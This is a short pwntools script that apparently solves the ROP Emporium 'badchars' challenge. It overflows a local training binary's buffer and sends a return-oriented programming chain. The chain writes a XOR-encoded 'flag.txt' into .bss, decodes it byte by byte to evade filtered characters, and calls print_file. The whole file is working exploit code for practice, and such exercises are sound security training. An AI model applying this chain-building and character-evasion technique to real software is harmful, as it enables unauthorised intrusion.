from pwn import *


badchars = ['x','g','a','.']

def xor_string(string, key):
    xored = []
    for s in string:
        char = chr(ord(s) ^ key)
        xored.append(char)
    return ''.join(xored)

key = 2
xored = xor_string("flag.txt", key)



p = process('./badchars')

payload = b"A" * 40


pops = 0x40069c
mov = 0x400634
xor = 0x400628
pop = 0x4006a3

pwnme = 0x400500
print_file = 0x400510
bss = 0x601038

x = 0xdeadc0dedeadc0de

# write XORed data
payload = b"A" * 40
payload += p64(pops) + xored.encode() + p64(bss) + p64(x) + p64(x)
payload += p64(mov)

# Inverse XORed data
for i in range(8): 
    payload += p64(pops) + p64(x) + p64(x) + p64(key) + p64(bss + i)
    payload += p64(xor)

# Call print_file
payload += p64(pop)
payload += p64(bss)
payload += p64(print_file)

p.sendline(payload)

print(p.recvall().decode())
